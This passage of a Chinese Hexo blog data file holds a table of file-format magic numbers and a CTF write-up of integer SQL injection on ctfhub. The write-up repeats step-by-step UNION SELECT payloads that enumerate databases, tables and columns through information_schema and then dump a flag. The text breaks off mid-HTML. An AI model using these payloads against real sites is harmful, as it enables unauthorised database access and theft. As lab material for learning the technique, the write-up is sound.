.JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, “WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”<br>第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。<br><a href=\"http://www.cnblogs.com/lwy-kitty/p/3928317.html\" target=\"_blank\" rel=\"noopener\">大佬的博客</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>zip文件学习</p>\n<p>﻿<strong>1.文件头文件尾总结</strong><br>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　<br>PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82<br>GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B</p>\n<p>TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：<br>CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：<br>XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：<br>HTML (html)，                           文件头：68746D6C3E<br>Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                    文件头：5374616E64617264204A<br>WordPerfect (wpd)，                  文件头：FF575043<br>Adobe Acrobat (pdf)，               文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，         文件头：E3828596</p>\n<p>RAR Archive (rar)，                    文件头：52617221<br>Wave (wav)，                            文件头：57415645<br>AVI (avi)，                                 文件头：41564920<br>Real Audio (ram)，                     文件头：2E7261FD<br>Real Media (rm)，                       文件头：2E524D46<br>MPEG (mpg)，                           文件头：000001BA<br>MPEG (mpg)，                           文件头：000001B3<br>Quicktime (mov)，                     文件头：6D6F6F76<br>Windows Media (asf)，               文件头：3026B2758E66CF11<br>MIDI (mid)，                              文件头：4D546864<br><strong>2.从winhex中取出的文件头列表</strong></p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;PHP;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08<br><strong>3.各种文件类型文件头标志位详细列表</strong></p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, “WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”<br>第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。<br><a href=\"http://www.cnblogs.com/lwy-kitty/p/3928317.html\" target=\"_blank\" rel=\"noopener\">大佬的博客</a></p>\n"},{"title":"SQL注入--整数注入","date":"2020-04-07T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp"],"_content":"\n\n\n﻿前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。\n什么是整形注入呐。[点这！](https://blog.csdn.net/qq_45869039/article/details/105190243)\n直接入题！！！\n**1.先判断是否存在注入。**\npayload:\n\n> ?id=1 and 1=1\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040712211553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n看到这里的正常回显。\n然后\n\n> ？id=1 and 1=2\n\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407122504901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n 回显错误。可以判断出是整形。\n **2.判断列数。**\n order by语句。\n> ?id=1 order by 1\n\n1 2  3.....直到出现报错。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123120136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n可以判断出只有两列。\n3.**爆数据库名。**\npayload:\n\n>  ?id=1 and 1=2 union select 1,database()\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123806722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n直接出来了！\n**3.爆表名。**\npayload:\n```\n?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124035584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n出来了两个表。看到了flag的曙光。\n**4.爆字段。**\npayload:\n```\n?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124334337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**5.爆值。**\npayload：\n\n```\n?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag\n\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124507438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。\n","source":"_posts/SQL注入——整数注入.md","raw":"---\ntitle: SQL注入--整数注入\ndate: 2020-04-07 15:04:05\ntags: SQL注入\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp\n---\n\n\n\n﻿前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。\n什么是整形注入呐。[点这！](https://blog.csdn.net/qq_45869039/article/details/105190243)\n直接入题！！！\n**1.先判断是否存在注入。**\npayload:\n\n> ?id=1 and 1=1\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040712211553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n看到这里的正常回显。\n然后\n\n> ？id=1 and 1=2\n\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407122504901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n 回显错误。可以判断出是整形。\n **2.判断列数。**\n order by语句。\n> ?id=1 order by 1\n\n1 2  3.....直到出现报错。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123120136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n可以判断出只有两列。\n3.**爆数据库名。**\npayload:\n\n>  ?id=1 and 1=2 union select 1,database()\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407123806722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n直接出来了！\n**3.爆表名。**\npayload:\n```\n?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124035584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n出来了两个表。看到了flag的曙光。\n**4.爆字段。**\npayload:\n```\n?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124334337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**5.爆值。**\npayload：\n\n```\n?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag\n\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407124507438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。\n","slug":"SQL注入——整数注入","published":1,"updated":"2020-05-11T09:25:53.769Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgn00069kq69nl5ffpf","content":"<p>﻿前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。<br>什么是整形注入呐。<a href=\"https://blog.csdn.net/qq_45869039/article/details/105190243\" target=\"_blank\" rel=\"noopener\">点这！</a><br>直接入题！！！<br><strong>1.先判断是否存在注入。</strong><br>payload:</p>\n<blockquote>\n<p>?id=1 and 1=1</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/2020040712211553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>看到这里的正常回显。<br>然后</p>\n<blockquote>\n<p>？id=1 and 1=2</p>\n</blockquote>\n<p> <img src=\"https://img-blog.csdnimg.cn/20200407122504901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 回显错误。可以判断出是整形。<br> <strong>2.判断列数。</strong><br> order by语句。</p>\n<blockquote>\n<p>?id=1 order by 1</p>\n</blockquote>\n<p>1 2  3…..直到出现报错。<br><img src=\"https://img-blog.csdnimg.cn/20200407123120136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以判断出只有两列。<br>3.<strong>爆数据库名。</strong><br>payload:</p>\n<blockquote>\n<p> ?id=1 and 1=2 union select 1,database()</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407123806722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>直接出来了！<br><strong>3.爆表名。</strong><br>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407124035584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>出来了两个表。看到了flag的曙光。<br><strong>4.爆字段。</strong><br>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407124334337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>5.爆值。</strong><br>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407124507438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：前几天（很久以前）在ctfhub上做了一道整形注入的题。<br>什么是整形注入呐。<a href=\"https://blog.csdn.net/qq_45869039/article/details/105190243\" target=\"_blank\" rel=\"noopener\">点这！</a><br>直接入题！！！<br><strong>1.先判断是否存在注入。</strong><br>payload:</p>\n<blockquote>\n<p>?id=1 and 1=1</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/2020040712211553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>看到这里的正常回显。<br>然后</p>\n<blockquote>\n<p>？id=1 and 1=2</p>\n</blockquote>\n<p> <img src=\"https://img-blog.csdnimg.cn/20200407122504901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 回显错误。可以判断出是整形。<br> <strong>2.判断列数。</strong><br> order by语句。</p>\n<blockquote>\n<p>?id=1 order by 1</p>\n</blockquote>\n<p>1 2  3…..直到出现报错。<br><img src=\"https://img-blog.csdnimg.cn/20200407123120136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以判断出只有两列。<br>3.<strong>爆数据库名。</strong><br>payload:</p>\n<blockquote>\n<p> ?id=1 and 1=2 union select 1,database()</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407123806722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>直接出来了！<br><strong>3.爆表名。</strong><br>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;</span><br></pre></td></tr></table></figure>\n<p><img 